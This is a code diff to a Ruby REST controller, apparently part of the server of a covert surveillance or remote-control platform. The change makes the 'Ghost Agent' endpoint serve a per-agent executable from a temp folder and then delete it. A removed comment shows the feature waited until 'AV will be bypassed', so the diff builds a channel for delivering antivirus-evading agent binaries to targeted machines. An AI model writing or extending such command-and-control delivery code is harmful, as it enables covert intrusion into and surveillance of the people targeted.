@@ -646,6 +646,8 @@ class AgentController < RESTController
     mongoid_query do
       agent = Item.where({_kind: 'agent', ident: ident, instance: Regexp.new(instance.prepend('^'))}).first
 
+      return if agent.nil?
+
       trace :info, "[#{@request[:peer]}] Ghost Agent request for #{agent.ident} #{agent.instance}"
 
       # update the stats
@@ -655,11 +657,16 @@ class AgentController < RESTController
       agent.save
     end
 
-    #file = File.binread("c:\\putty.exe")
-    #return ok(file, {content_type: 'binary/octetstream'})
+    file = "#{agent.ident}:#{agent.instance}.exe"
 
-    # TODO: implement this in the future (when AV will be bypassed)
-    return not_found()
+    return not_found() unless File.exist? Config.instance.temp(file)
+
+    content = File.binread(Config.instance.temp(file))
+    FileUtils.rm_rf Config.instance.temp(file)
+
+    trace :info, "[#{@request[:peer]}] Ghost Agent sent: #{file} (#{content.bytesize} bytes)"
+
+    return ok(content, {content_type: 'binary/octetstream'})
   end
 
   def activate_ghost
